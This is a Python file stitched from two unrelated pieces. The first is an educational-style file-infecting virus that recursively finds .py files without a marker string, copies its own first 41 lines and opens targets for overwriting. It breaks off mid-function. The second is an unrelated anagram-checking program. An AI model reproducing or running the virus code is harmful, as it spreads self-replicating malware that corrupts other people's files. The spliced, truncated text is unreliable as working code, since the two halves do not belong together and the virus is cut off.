#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python program to check if two strings
# are anagrams of each other

NO_OF_CHARS = 256

# function to check if two strings
# are anagrams of each other
def areAnagram(str1,str2):
	
	# If both strings are of different
	# length. Removing this condition
	# will make the program fail for
	# strings like "aaca" and "aca"
	if(len(str1) != len(str2)):
		return False;
	
	# Create a count array and initialize
	# all values as 0
	count=[0 for i in range(NO_OF_CHARS)]
	i=0
	
	# For each character in input strings,
	# increment count in the corresponding
	# count array
	for i in range(len(str1)):
		count[ord(str1[i]) - ord('a')] += 1;
		count[ord(str2[i]) - ord('a')] -= 1;
		
	# See if there is any non-zero
	# value in count array
	for i in range(NO_OF_CHARS):
		if (count[i] != 0):
			return False
		
	
	return True

# Driver code
str1="geeksforgeeks"
str2="forgeeksgeeks"

# Function call
if (areAnagram(str1, str2)):
	print("The two strings are anagram of each other")
else:
	print("The two strings are not anagram of each other")
	
	
# This code is contributed by patel2127
# Time Complexity: O(n)
# Space Complexity: O(1)
